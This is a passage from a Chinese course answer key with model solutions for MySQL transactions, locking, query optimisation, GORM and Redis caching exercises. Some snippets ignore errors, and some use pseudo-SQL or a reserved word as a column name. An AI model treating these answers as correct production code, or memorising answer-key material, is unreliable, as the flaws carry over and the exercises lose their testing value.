    SELECT '转账成功' AS result;
END IF;
```

**MySQL 存储过程版本**：
```sql
DELIMITER $$
CREATE PROCEDURE transfer(IN from_id INT, IN to_id INT, IN amount DECIMAL(12,2))
BEGIN
    DECLARE current_balance DECIMAL(12,2);
    DECLARE EXIT HANDLER FOR SQLEXCEPTION ROLLBACK;

    START TRANSACTION;
    SELECT balance INTO current_balance FROM accounts WHERE id = from_id FOR UPDATE;

    IF current_balance < amount THEN
        ROLLBACK;
        SIGNAL SQLSTATE '45000' SET MESSAGE_TEXT = '余额不足';
    ELSE
        UPDATE accounts SET balance = balance - amount WHERE id = from_id;
        UPDATE accounts SET balance = balance + amount WHERE id = to_id;
        COMMIT;
    END IF;
END$$
DELIMITER ;
```

**解析**：
- `FOR UPDATE`：悲观锁，读取时锁定该行，防止其他事务在检查余额和扣款之间修改余额。
- `DECLARE EXIT HANDLER FOR SQLEXCEPTION ROLLBACK`：发生任何 SQL 异常自动回滚。
- 关键顺序：先 `SELECT ... FOR UPDATE`（锁住 from 账户行），再判断余额，再扣款+加款。若先判断再锁，有并发竞争窗口。

**改值实验**：
- **去掉 `FOR UPDATE`**：两个事务同时读到 balance=1000，各自判断 200 ≤ 1000，都扣款，最终余额可能是 600（而不是 800）。这就是丢失更新。
  为什么要注意？→ 在转账场景中，读-判断-写三步必须有原子性。`FOR UPDATE` 保证了读到的是最新且不会被并发修改的值。
  理解什么？→ ACID 中的 I（Isolation），默认的 REPEATABLE READ 隔离级别不能防止丢失更新——只有 SERIALIZABLE 或显式锁才能。

---

### K-56-2 隔离级别实验

**标准答案**：

**脏读实验（READ UNCOMMITTED）**：
```
会话 A                              会话 B
SET SESSION tx_isolation =          SET SESSION tx_isolation =
  'READ-UNCOMMITTED';                 'READ-UNCOMMITTED';
START TRANSACTION;                  START TRANSACTION;
UPDATE accounts SET balance=500     SELECT balance FROM accounts
  WHERE id=1;                         WHERE id=1;
-- 结果：500 ← 脏读！A 还没提交
                                    COMMIT;
ROLLBACK;  -- A 回滚了！
-- B 读到了一个从未存在的值
```

**不可重复读实验（READ COMMITTED）**：
```
会话 A                              会话 B
SET SESSION tx_isolation =          SET SESSION tx_isolation =
  'READ-COMMITTED';                   'READ-COMMITTED';
START TRANSACTION;                  START TRANSACTION;
SELECT balance FROM accounts
  WHERE id=1;
-- 结果：1000
                                    UPDATE accounts SET balance=888
                                      WHERE id=1;
                                    COMMIT;
SELECT balance FROM accounts
  WHERE id=1;
-- 结果：888 ← 不可重复读！
COMMIT;
```

**REPEATABLE READ 不会出现不可重复读**：
在 REPEATABLE READ 下，会话 A 第二次 SELECT 仍看到 1000（快照读），这就是 MVCC 的快照隔离。

**换个角度想**：脏读 → 读到未提交；不可重复读 → 同一事务两次读不同；幻读 → 同一事务两次读行数不同。MySQL InnoDB 的 REPEATABLE READ 通过 MVCC 解决了不可重复读，通过 Next-Key Lock 解决了大部分幻读。这就是为什么它是默认隔离级别。

---

### K-56-3 事务并发问题 ⭐

**标准答案**：

**丢失更新模拟**：
```
-- 初始 balance = 1000
-- 事务 T1                          事务 T2
START TRANSACTION;                  START TRANSACTION;
SELECT balance FROM accounts        SELECT balance FROM accounts
  WHERE id=1; -- 读到 1000            WHERE id=1; -- 读到 1000
UPDATE accounts SET balance=
  1000 + 100 = 1100 WHERE id=1;
                                    UPDATE accounts SET balance=
                                      1000 + 100 = 1100 WHERE id=1;
COMMIT;                             COMMIT;
-- 最终 balance = 1100（正确应为 1200）
```

**使用 SELECT ... FOR UPDATE 修复**：
```sql
-- T1
START TRANSACTION;
SELECT balance FROM accounts WHERE id = 1 FOR UPDATE;  -- 锁住该行
-- T2 尝试 SELECT ... FOR UPDATE 会被阻塞，直到 T1 COMMIT
UPDATE accounts SET balance = balance + 100 WHERE id = 1;
COMMIT;
-- T2 现在获得锁，读到 balance=1100
-- T2 更新为 1200
```

**Go 伪代码**：
```go
func Transfer(db *sql.DB, fromID, toID int, amount float64) error {
    tx, _ := db.Begin()
    defer tx.Rollback()

    // FOR UPDATE 锁定行
    var balance float64
    err := tx.QueryRow("SELECT balance FROM accounts WHERE id = ? FOR UPDATE", fromID).Scan(&balance)
    if balance < amount {
        return errors.New("余额不足")
    }
    tx.Exec("UPDATE accounts SET balance = balance - ? WHERE id = ?", amount, fromID)
    tx.Exec("UPDATE accounts SET balance = balance + ? WHERE id = ?", amount, toID)
    return tx.Commit()
}
```

**改值实验**：
- **把 `FOR UPDATE` 改成 `LOCK IN SHARE MODE`**：允许并发读但不允许写。多个事务可以同时持有共享锁，但都不能修改——这会导致死锁概率大增（两个事务都想升级为排他锁）。
  为什么要注意？→ `FOR UPDATE` = 排他锁（我准备写），`LOCK IN SHARE MODE` = 共享锁（我只想读）。转账场景你要写，必须用 `FOR UPDATE`。
  理解什么？→ MySQL 的锁分为共享锁（S）和排他锁（X）。S 和 S 兼容（大家都能读），X 和任何锁都不兼容（排他）。

---

## 第57章 · 锁

### K-57-1 模拟死锁

**标准答案**：
```sql
-- 准备数据
INSERT INTO accounts (id, owner, balance) VALUES (1, 'A', 1000), (2, 'B', 1000);

-- 事务 T1（先锁 id=1，再锁 id=2）
START TRANSACTION;
UPDATE accounts SET balance = balance - 100 WHERE id = 1;
-- 此时 T1 持有 id=1 的 X 锁

-- 事务 T2（先锁 id=2，再锁 id=1）
START TRANSACTION;
UPDATE accounts SET balance = balance - 100 WHERE id = 2;
-- 此时 T2 持有 id=2 的 X 锁

-- T1 继续
UPDATE accounts SET balance = balance + 100 WHERE id = 2;
-- T1 等待 id=2 的锁（被 T2 持有）→ 阻塞

-- T2 继续
UPDATE accounts SET balance = balance + 100 WHERE id = 1;
-- T2 等待 id=1 的锁（被 T1 持有）→ 阻塞
-- MySQL 检测到死锁 → 回滚其中一个事务

SHOW ENGINE INNODB STATUS\G
-- 在 LATEST DETECTED DEADLOCK 段落查看死锁详情
```

**解析**：
- 死锁四个必要条件：互斥、持有并等待、不可剥夺、循环等待。这里 T1 等 T2 的锁，T2 等 T1 的锁，形成环路。
- InnoDB 自动检测死锁，回滚代价较小的事务（undo log 少的事务）。
- 预防死锁：统一加锁顺序——所有事务都按 `id ASC` 顺序锁行。

**换个角度想**：死锁不是 bug，是多线程并发系统的固有特性。InnoDB 的死锁检测是有成本的——如果 1000 个事务都在等待，检测死锁也会消耗大量 CPU。这也是为什么高并发场景推荐乐观锁或消息队列串行化处理。

---

### K-57-2 乐观锁 vs 悲观锁

**标准答案**：

**悲观锁（SELECT ... FOR UPDATE）**：
```sql
-- 表：accounts (id, owner, balance)
START TRANSACTION;
SELECT balance FROM accounts WHERE id = 1 FOR UPDATE;
UPDATE accounts SET balance = balance - 100 WHERE id = 1 AND balance >= 100;
COMMIT;
```

**乐观锁（version 字段）**：
```sql
-- 表需加 version 字段
ALTER TABLE accounts ADD COLUMN version INT NOT NULL DEFAULT 0;

-- 扣款
UPDATE accounts
SET balance = balance - 100, version = version + 1
WHERE id = 1 AND balance >= 100 AND version = @old_version;
-- 如果 affected_rows = 0 → 版本冲突，重试

-- Go 伪代码
func DeductOptimistic(db *sql.DB, id int, amount float64) error {
    for i := 0; i < 3; i++ {
        var balance float64
        var version int
        db.QueryRow("SELECT balance, version FROM accounts WHERE id = ?", id).Scan(&balance, &version)

        if balance < amount {
            return errors.New("余额不足")
        }
        result, _ := db.Exec(
            "UPDATE accounts SET balance = balance - ?, version = version + 1 WHERE id = ? AND version = ?",
            amount, id, version,
        )
        affected, _ := result.RowsAffected()
        if affected > 0 {
            return nil
        }
        time.Sleep(time.Millisecond * time.Duration(rand.Intn(50)))
    }
    return errors.New("重试次数耗尽")
}
```

**对比**：

| 维度 | 乐观锁 | 悲观锁 |
|------|--------|--------|
| 冲突频率 | 低冲突场景 | 高冲突场景 |
| 吞吐量 | 高（无锁等待） | 低（排队等待） |
| 实现复杂度 | 需重试机制 | 简单 |
| 适用场景 | 读多写少（如用户资料编辑） | 写多冲突大（如秒杀扣库存） |

**换个角度想**：乐观锁假设「大概率没冲突」，冲突了再重试；悲观锁假设「一定有冲突」，先锁住再说。怎么选？看你系统的冲突概率。如果你的扣款是秒杀场景，1000 人抢 100 件，乐观锁会让 900 人白重试——这时候悲观锁更合适。

---

### K-57-3 高并发扣库存 ⭐

**标准答案**：

**表 DDL**：
```sql
CREATE TABLE seckill_products (
    id INT PRIMARY KEY,
    name VARCHAR(100) NOT NULL,
    total_stock INT NOT NULL,
    price DECIMAL(10,2) NOT NULL,
    start_time DATETIME NOT NULL,
    end_time DATETIME NOT NULL
);

CREATE TABLE seckill_orders (
    id BIGINT PRIMARY KEY,
    user_id INT NOT NULL,
    product_id INT NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    UNIQUE KEY uk_user_product (user_id, product_id)  -- 防重复购买
);
```

**方案：Redis 预减库存 + 异步下单**：
```go
// 1. Redis 预减库存（原子操作）
func PreDeductStock(ctx context.Context, productID int) (bool, error) {
    key := fmt.Sprintf("seckill:stock:%d", productID)
    result, err := rdb.Decr(ctx, key).Result()
    if err != nil {
        return false, err
    }
    if result < 0 {
        // 库存不足，恢复
        rdb.Incr(ctx, key)
        return false, nil
    }
    return true, nil
}

// 2. 发送到消息队列，异步创建订单
func CreateOrderAsync(userID, productID int) error {
    msg := map[string]interface{}{
        "user_id":    userID,
        "product_id": productID,
        "timestamp":  time.Now().Unix(),
    }
    data, _ := json.Marshal(msg)
    return mq.Publish("seckill_orders", data)
}

// 3. 消费者：真正扣 MySQL 库存 + 创建订单
func ConsumeSeckillOrder(msg []byte) error {
    // ...解析消息...
    tx, _ := db.Begin()
    result, _ := tx.Exec(
        "UPDATE seckill_products SET total_stock = total_stock - 1 WHERE id = ? AND total_stock > 0",
        productID,
    )
    affected, _ := result.RowsAffected()
    if affected == 0 {
        tx.Rollback()
        // 补偿 Redis 库存
        rdb.Incr(ctx, fmt.Sprintf("seckill:stock:%d", productID))
        return nil
    }
    tx.Exec("INSERT INTO seckill_orders (...) VALUES (...)")
    tx.Commit()
    return nil
}
```

**为什么不用简单的 `UPDATE ... WHERE stock > 0` + 事务**：
1. 数据库行锁成为瓶颈——所有请求串行化，QPS 受限于 MySQL 单行更新能力（约 500~1000/s）。
2. 事务持有锁时间长（包括网络 IO），连接池迅速耗尽。
3. 大量请求直接打到数据库，可能拖垮整个 DB 服务。

**换个角度想**：秒杀的核心矛盾是「成千上万的请求 vs 有限的库存」。解决策略是分层过滤：Redis 挡住 99% 的无效请求（库存没了直接拒绝），只有少数成功请求到 MySQL。这叫「漏斗模型」——流量逐层递减。

---

## 第58章 · 优化

### K-58-1 慢查询分析

**标准答案**：

```sql
-- 1. 开启慢查询日志
SET GLOBAL slow_query_log = ON;
SET GLOBAL long_query_time = 0.1;
SET GLOBAL log_queries_not_using_indexes = ON;

-- 2. 插入 10 万条（存储过程）
DELIMITER $$
CREATE PROCEDURE insert_logs(IN total INT)
BEGIN
    DECLARE i INT DEFAULT 1;
    WHILE i <= total DO
        INSERT INTO logs (user_id, action, target_type, target_id, created_at, ip)
        VALUES (
            FLOOR(1 + RAND() * 1000),
            ELT(FLOOR(1 + RAND() * 4), 'login', 'query', 'update', 'delete'),
            ELT(FLOOR(1 + RAND() * 3), 'article', 'user', 'order'),
            FLOOR(1 + RAND() * 10000),
            DATE_ADD('2024-01-01', INTERVAL FLOOR(RAND() * 365) DAY),
            CONCAT('192.168.', FLOOR(RAND()*255), '.', FLOOR(RAND()*255))
        );
        SET i = i + 1;
    END WHILE;
END$$
DELIMITER ;

CALL insert_logs(100000);

-- 3. 全表扫描查询
SELECT * FROM logs WHERE ip LIKE '192.168.%';
-- 查看慢查询日志：应在 slow_query_log_file 中看到该条

-- 4. 添加索引后对比
CREATE INDEX idx_ip ON logs(ip);
SELECT * FROM logs WHERE ip LIKE '192.168.%';
-- 再次 EXPLAIN：type=range，rows 大幅减少
```

**解析**：
- `long_query_time = 0.1`：阈值 100ms。生产环境通常设 1~2 秒。
- `log_queries_not_using_indexes`：记录所有未使用索引的查询，便于发现潜在问题。
- `LIKE '192.168.%'` 可以用到 `ip` 列的索引（因为通配符在后），如果是 `LIKE '%192.168%'` 则无法使用。

**改值实验**：
- **把 `long_query_time` 从 0.1 改成 0**：所有查询都进入慢查询日志，日志文件瞬间增大。这在排查问题时有用，但不应长期开启。
  为什么要注意？→ 慢查询日志有 IO 开销。阈值太低会拖慢 MySQL 本身。
  理解什么？→ 慢查询日志是诊断工具，不是监控工具。生产环境用 Performance Schema 进行持续监控更合理。

---

### K-58-2 SQL 改写优化

**标准答案**：

```sql
-- 原始 SQL 1：函数包裹导致索引失效
-- SELECT * FROM orders WHERE YEAR(created_at) = 2024 AND MONTH(created_at) = 6;

-- 改写后
SELECT * FROM orders
WHERE created_at >= '2024-06-01' AND created_at < '2024-07-01';
-- EXPLAIN: type=range, key=idx_created_at（如果建有索引）

-- 原始 SQL 2：子查询 + LEFT JOIN
-- SELECT o.*, u.name FROM orders o
-- LEFT JOIN users u ON u.id = o.user_id
-- WHERE o.amount > (SELECT AVG(amount) FROM orders);

-- 改写后（用变量避免重复计算 AVG）
SET @avg_amount = (SELECT AVG(amount) FROM orders);
SELECT o.*, u.name
FROM orders o
JOIN users u ON u.id = o.user_id
WHERE o.amount > @avg_amount;

-- 或使用 CTE
WITH avg_amt AS (
    SELECT AVG(amount) AS avg_amount FROM orders
)
SELECT o.*, u.name
FROM orders o
JOIN users u ON u.id = o.user_id
CROSS JOIN avg_amt
WHERE o.amount > avg_amt.avg_amount;
```

**解析**：
- SQL 1：`YEAR()` 和 `MONTH()` 是函数，包裹索引列导致索引失效。改为范围查询后可以用到索引。
- SQL 2：原始查询中，LEFT JOIN 在子查询之后执行，且 `SELECT AVG()` 对每行都计算一次（取决于优化器）。改写后 AVG 只算一次。此外，WHERE 条件有 `o.amount > ...`，说明 orders 表中必有匹配行，LEFT JOIN 改为 INNER JOIN 即可，效率更高。

**改值实验**：
- **把 `YEAR(created_at) = 2024` 改成 `created_at LIKE '2024%'`**：这也是一个常见的「自以为能优化」的错误。LIKE 隐式将 DATETIME 转为字符串，索引同样失效。
  为什么要注意？→ 任何对索引列做运算或类型转换的操作都会导致索引失效。唯一安全的是范围比较。
  理解什么？→ 优化器的判断标准是「能否在索引树中确定值的顺序位置」。范围可以，函数不可以。

---

### K-58-3 综合优化方案 ⭐

**标准答案**：

**1. 表结构调整 — 创建月销售汇总表**
```sql
CREATE TABLE monthly_sales_summary (
    id INT PRIMARY KEY AUTO_INCREMENT,
    year_month CHAR(7) NOT NULL COMMENT '格式：2024-06',
    product_id INT NOT NULL,
    product_name VARCHAR(200) NOT NULL,
    total_quantity INT NOT NULL DEFAULT 0,
    total_amount DECIMAL(14,2) NOT NULL DEFAULT 0,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    UNIQUE KEY uk_month_product (year_month, product_id),
    INDEX idx_month_amount (year_month, total_amount DESC)
) COMMENT '月销售汇总表';
```

**2. 索引设计 — 原订单表补充索引**
```sql
-- 已有 orders: 假设有 (created_at) 索引
-- 补充联合索引用于汇总计算
ALTER TABLE orders ADD INDEX idx_created_status (created_at, status);
ALTER TABLE order_items ADD INDEX idx_order_product (order_id, product_id);
```

**3. 查询改写 — 汇总表直接查询**
```sql
-- 原查询（慢）：JOIN orders + order_items + products，GROUP BY 年月
-- 改写后：
SELECT product_id, product_name, total_quantity, total_amount
FROM monthly_sales_summary
WHERE year_month = '2024-06'
ORDER BY total_amount DESC
LIMIT 10;
-- 查询时间：30s → <10ms
```

**4. 定时汇总任务（每天凌晨执行）**
```sql
INSERT INTO monthly_sales_summary (year_month, product_id, product_name, total_quantity, total_amount)
SELECT
    DATE_FORMAT(o.created_at, '%Y-%m') AS year_month,
    oi.product_id,
    p.name,
    SUM(oi.quantity),
    SUM(oi.quantity * oi.unit_price)
FROM orders o
JOIN order_items oi ON o.id = oi.order_id
JOIN products p ON p.id = oi.product_id
WHERE o.created_at >= DATE_FORMAT(NOW() - INTERVAL 1 MONTH, '%Y-%m-01')
  AND o.status IN (1, 2, 3)
GROUP BY year_month, oi.product_id, p.name
ON DUPLICATE KEY UPDATE
    total_quantity = VALUES(total_quantity),
    total_amount = VALUES(total_amount);
```

**5. 缓存策略**：
- Redis 缓存热点月份的 Top 10（TTL=1 小时），key=`report:monthly_top10:2024-06`
- 当月数据不缓存（实时性要求），查询汇总表即可

**换个角度想**：30s → 10ms 的优化，不是靠「加索引」就能做到的——这是 3000 倍的提升，必须靠架构层面的「预计算」。这是性能优化的终极武器：**不要重复计算相同的东西**。如果报表每天被看 1000 次，你应该算 1 次（定时任务），而不是 1000 次。

---

## 第59章 · Go + MySQL (GORM)

### K-59-1 GORM CRUD 实现

**标准答案**：
```go
package main

import (
    "fmt"
    "log"
    "time"

    "gorm.io/driver/mysql"
    "gorm.io/gorm"
    "gorm.io/gorm/clause"
)

type Article struct {
    ID        uint           `gorm:"primaryKey"`
    Title     string         `gorm:"size:200;not null"`
    Content   string         `gorm:"type:text"`
    Author    string         `gorm:"size:50"`
    ViewCount int            `gorm:"default:0"`
    CreatedAt time.Time
    DeletedAt gorm.DeletedAt `gorm:"index"`
}

func main() {
    dsn := "root:your_password@tcp(127.0.0.1:3306)/practice_db?charset=utf8mb4&parseTime=True"
    db, err := gorm.Open(mysql.Open(dsn), &gorm.Config{})
    if err != nil {
        log.Fatal(err)
    }

    db.AutoMigrate(&Article{})

    // Create
    articles := []Article{
        {Title: "Go入门", Content: "...", Author: "张三", ViewCount: 100},
        {Title: "GORM教程", Content: "...", Author: "张三", ViewCount: 5},
        {Title: "Redis实战", Content: "...", Author: "李四", ViewCount: 50},
    }
    db.Create(&articles)

    // Read
    var result []Article
    db.Where("author = ?", "张三").Order("view_count DESC").Find(&result)
    for _, a := range result {
        fmt.Printf("ID=%d Title=%s ViewCount=%d\n", a.ID, a.Title, a.ViewCount)
    }

    // Update
    db.Model(&Article{}).Where("view_count < ?", 10).
        UpdateColumn("view_count", gorm.Expr("view_count + ?", 5))

    // Delete (软删除)
    db.Where("author = ?", "李四").Delete(&Article{})
}
```

**解析**：
- `gorm.DeletedAt`：GORM 的软删除支持，`Delete()` 实际是 `UPDATE SET deleted_at=NOW()`，数据仍在表中。
- `UpdateColumn` vs `Update`：`UpdateColumn` 不触发 Hook、不更新 `updated_at`。
- `gorm.Expr("view_count + ?", 5)`：使用 SQL 表达式，在数据库层面完成加法，避免读出-加-写回的竞态条件。

**改值实验**：
- **把 `UpdateColumn` 改成先 `Find` 再循环 `Save`**：在并发场景下，两个请求同时读到 view_count=5，各自加 5 后 Save=10，实际应该是 5+5+5=15。
  为什么要注意？→ 读-改-写是非原子的，需要用 SQL 表达式或悲观锁保证并发安全。
  理解什么？→ GORM 的 `gorm.Expr` 让你在 ORM 中使用原生 SQL 能力，兼顾 ORM 的便利和原生 SQL 的性能。

---

### K-59-2 连接池配置

**标准答案**：
```go
package main

import (
    "fmt"
    "log"
    "time"

    "gorm.io/driver/mysql"
    "gorm.io/gorm"
)

func main() {
    dsn := "root:your_password@tcp(127.0.0.1:3306)/practice_db?charset=utf8mb4&parseTime=True"
    db, err := gorm.Open(mysql.Open(dsn), &gorm.Config{})
    if err != nil {
        log.Fatal(err)
    }

    sqlDB, err := db.DB()
    if err != nil {
        log.Fatal(err)
    }

    sqlDB.SetMaxOpenConns(100)
    sqlDB.SetMaxIdleConns(10)
    sqlDB.SetConnMaxLifetime(1 * time.Hour)
    sqlDB.SetConnMaxIdleTime(10 * time.Minute)

    // 验证配置
    stats := sqlDB.Stats()
    fmt.Printf("MaxOpenConnections: %d\n", stats.MaxOpenConnections)
    // 注意：Stats() 返回的是运行时统计，不直接暴露配置值
    // 更可靠的验证：直接用 Ping + 查看数据库 SHOW PROCESSLIST

    // 验证连接池生效
    if err := sqlDB.Ping(); err != nil {
        log.Fatal(err)
    }
    fmt.Println("连接池配置完成，数据库连接正常")
}
```

**解析**：
- `db.DB()`：从 GORM 获取底层的 `*sql.DB` 来配置连接池。
- `SetMaxOpenConns(100)`：最大打开连接数。太小 → 请求排队；太大 → MySQL 连接数压力大。
- `SetMaxIdleConns(10)`：空闲连接池大小。太小 → 频繁创建/销毁连接。
- `SetConnMaxLifetime(1h)`：连接最大存活时间，超时后关闭重建。防止 MySQL `wait_timeout` 导致的「gone away」错误。
- `SetConnMaxIdleTime(10m)`：空闲连接最长保留时间。

**改值实验**：
- **把 `MaxOpenConns` 从 100 改成 5，然后用并发 50 请求压测**：大部分请求会阻塞等待连接，响应时间从 ms 级别飙升到秒级别。
  为什么要注意？→ 连接池太小 = 隐藏的性能瓶颈。监控 `stats.WaitCount` 和 `stats.WaitDuration` 可以发现连接池不够的问题。
  理解什么？→ 连接池是应用程序和数据库之间的「缓冲带」。太小则排队，太大则浪费数据库资源。一个经验公式：MaxOpenConns ≈ CPU 核数 × 2 到 4。

---

### K-59-3 事务 + 批量操作 ⭐

**标准答案**：
```go
package main

import (
    "encoding/csv"
    "errors"
    "fmt"
    "log"
    "strings"

    "gorm.io/driver/mysql"
    "gorm.io/gorm"
    "gorm.io/gorm/clause"
)

func BatchImportArticles(db *gorm.DB, csvData string) error {
    reader := csv.NewReader(strings.NewReader(csvData))
    records, err := reader.ReadAll()
    if err != nil {
        return err
    }

    return db.Transaction(func(tx *gorm.DB) error {
        for i, row := range records {
            if len(row) < 3 {
                continue
            }
            title, content, author := row[0], row[1], row[2]

            // SavePoint：每条记录前设置回滚点
            tx.SavePoint(fmt.Sprintf("sp_%d", i))

            var exists int64
            tx.Model(&Article{}).Where("title = ?", title).Count(&exists)
            if exists > 0 {
                log.Printf("跳过重复标题: %s", title)
                tx.RollbackTo(fmt.Sprintf("sp_%d", i))
                continue
            }

            article := Article{Title: title, Content: content, Author: author}
            if err := tx.Create(&article).Error; err != nil {
                // 解析失败 → 回滚到 savepoint
                log.Printf("解析失败 [%s]: %v", title, err)
                tx.RollbackTo(fmt.Sprintf("sp_%d", i))
                continue
            }
        }
        return nil
    })
}
```

**解析**：
- `db.Transaction(func(tx *gorm.DB) error { ... })`：自动管理事务的开启、提交和回滚。返回 error 则回滚。
- `SavePoint` + `RollbackTo`：GORM 支持嵌套事务/部分回滚。每条记录前设保存点，失败只回滚到该点，不影响前面的记录。
- 注意：本题要求"任意一条解析失败则回滚整批"，以上代码使用的是 SavePoint 实现部分回滚。如需整批回滚，只需在循环中遇到错误直接 `return err` 即可。

**改值实验**：
- **去掉 SavePoint，遇到重复直接 `return errors.New(...)`**：整个事务回滚，前面所有已成功插入的数据全部丢失。
  为什么要注意？→ 整批回滚 vs 部分回滚是业务决策。如果是用户批量上传文件，一个错误导致全部失败体验很差；如果是金融数据，宁可全部失败也不接受部分成功。
  理解什么？→ 事务粒度 = 一次原子操作的范围。细粒度（逐条事务）=灵活性高、性能差；粗粒度（批次事务）=一致性高、一个失败全失败。

---

## 第60章 · Redis 基础

### K-60-1 Redis 安装与基本操作

**标准答案**：
```bash
redis-cli

SET user:1 '{"name":"Alice","age":25}'
# OK

GET user:1
# "{\"name\":\"Alice\",\"age\":25}"

EXPIRE user:1 60
# (integer) 1

TTL user:1
# (integer) 58   ← 剩余秒数，每次执行结果不同

INCR visit_count
# (integer) 1

INCRBY visit_count 10
# (integer) 11

GET visit_count
# "11"
```

**解析**：
- `EXPIRE` 设置过期时间（秒），`TTL` 查看剩余时间。返回 -1 表示永不过期，-2 表示 key 不存在。
- `INCR`：原子递增，即使 1000 个客户端同时执行，也不会出现计数错误。这是 Redis 单线程模型的优势。
- 注意存储 JSON 字符串时，Redis 不会解析内容，只是存一个字符串。

**改值实验**：
- **把 `EXPIRE user:1 60` 改成 `EXPIRE user:1 0`**：key 被立即删除。`EXPIRE` 的负值或 0 值行为不同：
  为什么要注意？→ `EXPIRE key 0` = 立即删除 key，等同于 `DEL key`。这是很多事故的根源——误将过期时间设为 0。
  理解什么？→ 过期时间设置为正数 = 定时删除；设置为负数或 0 = 立即删除。

---

### K-60-2 五种数据类型练习

**标准答案**：
```bash
# === String：缓存文章内容 ===
SET article:1 '{"title":"Go入门","content":"...","author":"张三"}'
GET article:1
EXPIRE article:1 600

# === Hash：存储用户信息 ===
HSET user:100 name "Alice" email "alice@example.com" age "25"
HGET user:100 name
# "Alice"
HGETALL user:100
# 1) "name"  2) "Alice"  3) "email"  4) "alice@example.com"  5) "age" 6) "25"
HINCRBY user:100 age 1   # 年龄+1

# === List：最近浏览记录 ===
LPUSH history:user:1 "article:5" "article:3" "article:8"
LTRIM history:user:1 0 19   # 保留最近 20 条
LRANGE history:user:1 0 -1   # 查看全部

# === Set：文章标签 ===
SADD tags:article:1 "golang" "backend" "tutorial"
SADD tags:article:1 "redis" "database"
SMEMBERS tags:article:1
# 随机顺序，"golang" "backend" "tutorial" "redis" "database"
SCARD tags:article:1   # 标签数量
# (integer) 5

# === SortedSet：文章排行榜 ===
ZADD rank:articles 100 "article:1"
ZADD rank:articles 250 "article:2"
ZADD rank:articles 180 "article:3"
ZRANGE rank:articles 0 -1 WITHSCORES   # 全部排名（低到高）
ZREVRANGE rank:articles 0 2 WITHSCORES   # Top 3（高到低）
ZSCORE rank:articles "article:1"   # 查看某篇分数
# "100"
ZINCRBY rank:articles 1 "article:1"   # 加 1 个浏览量
```

**解析**：
- Hash：适合存储对象的多个属性，比 String 存 JSON 更节省内存，且可以单独更新某个字段。
- List：`LTRIM` 是关键——保持 List 的长度可控，防止无限增长。
- Set：元素唯一，自动去重。`SINTER`、`SUNION` 做交集/并集很方便。
- SortedSet：按 score 排序，`ZRANGE` 升序，`ZREVRANGE` 降序。score 相同时按成员字典序排列。

**改值实验**：
- **用 String 存 JSON 替代 Hash 存用户信息**：更新 age 时，需要 `GET` → 反序列化 → 修改 → 序列化 → `SET`。而 Hash 只需要 `HINCRBY user:100 age 1`。
  为什么要注意？→ Hash 的优势是部分更新，String 必须全量读写。在高并发更新不同字段时，String 有覆盖写风险（A 改 age、B 改 email，后写的覆盖先写的）。
  理解什么？→ 数据结构选择的第一原则：匹配访问模式。如果你总是读写整个对象，String 够用；如果你频繁修改个别字段，Hash 更好。

---

### K-60-3 缓存穿透/击穿/雪崩 ⭐

**标准答案**：

**1. 缓存穿透**：大量请求查询不存在的数据（如 id=-1）

方案：**布隆过滤器 + 空值缓存**
```go
// 方案A：缓存空值（最简单）
func GetArticle(id int64) (*Article, error) {
    key := fmt.Sprintf("article:%d", id)
    val, err := rdb.Get(ctx, key).Result()
    if err == nil {
        if val == "NULL" {
            return nil, ErrNotFound
        }
        // 反序列化返回...
    }
    // 查 DB
    article, err := db.FindByID(id)
    if err == ErrNotFound {
        // 缓存空值，TTL 短（1分钟），防止恶意攻击
        rdb.Set(ctx, key, "NULL", 1*time.Minute)
        return nil, ErrNotFound
    }
    // 正常缓存...
}

// 方案B：布隆过滤器（需要额外维护）
// 预热时将所有存在的 ID 加入布隆过滤器
// 查询前先判断布隆过滤器，不存在直接返回
```

**2. 缓存击穿**：热点 key 过期瞬间，大量请求打到 DB

方案：**互斥锁 / singleflight**
```go
func GetHotArticle(id int64) (*Article, error) {
    key := fmt.Sprintf("article:%d", id)
    val, err := rdb.Get(ctx, key).Result()
    if err == nil {
        return unmarshal(val)
    }

    // 缓存未命中，加分布式锁
    lockKey := fmt.Sprintf("lock:article:%d", id)
    locked, _ := rdb.SetNX(ctx, lockKey, "1", 10*time.Second).Result()
    if !locked {
        // 没抢到锁，等待后重试
        time.Sleep(100 * time.Millisecond)
        return GetHotArticle(id)
    }
    defer rdb.Del(ctx, lockKey)

    // 双重检查（抢到锁后可能别人已重建缓存）
    val, err = rdb.Get(ctx, key).Result()
    if err == nil {
        return unmarshal(val)
    }

    article, _ := db.FindByID(id)
    data, _ := json.Marshal(article)
    rdb.Set(ctx, key, data, 10*time.Minute)
    return article, nil
}
```

**3. 缓存雪崩**：大量 key 同时过期

方案：**过期时间加随机值**
```go
func SetWithRandomExpire(key string, value interface{}, base time.Duration) {
    // 在基准 TTL 上叠加 ±20% 的随机值
    jitter := time.Duration(rand.Int63n(int64(base) * 40 / 100)) - time.Duration(base*20/100)
    ttl := base + jitter
    rdb.Set(ctx, key, value, ttl)
}
```

**换个角度想**：这三个问题的本质是什么？穿透 = 请求打到了不该打的地方（不存在的数据）；击穿 = 请求集中打到了同一个点（热点 key）；雪崩 = 请求分散打到了太多点（大量 key 同时过期）。理解区别才能对症下药。

---

## 第61章 · Redis 进阶

### K-61-1 分布式锁实现

**标准答案**：
```go
package main

import (
    "context"
    "crypto/rand"
    "encoding/hex"
    "errors"
    "fmt"
    "time"

    "github.com/redis/go-redis/v9"
)

type RedisLock struct {
    rdb *redis.Client
}

func NewRedisLock(rdb *redis.Client) *RedisLock {
    return &RedisLock{rdb: rdb}
}

func (l *RedisLock) Lock(ctx context.Context, key string, ttl time.Duration) (string, error) {
    // 生成唯一 value（用于解锁时验证归属）
    b := make([]byte, 16)
    rand.Read(b)
    value := hex.EncodeToString(b)

    ok, err := l.rdb.SetNX(ctx, key, value, ttl).Result()
    if err != nil {
        return "", err
    }
    if !ok {
        return "", errors.New("lock already held")
    }
    return value, nil
}

func (l *RedisLock) Unlock(ctx context.Context, key, value string) error {
    // Lua 脚本：验证归属 + 删除（原子操作）
    script := `
        if redis.call("GET", KEYS[1]) == ARGV[1] then
            return redis.call("DEL", KEYS[1])
        else
            return 0
        end
    `
    result, err := l.rdb.Eval(ctx, script, []string{key}, value).Result()
    if err != nil {
        return err
    }
    if result.(int64) == 0 {
        return errors.New("unlock failed: not lock owner or lock expired")
    }
    return nil
}
```

**解析**：
- `SetNX`：SET if Not eXists，只有 key 不存在时才设置成功，天然适合做锁。
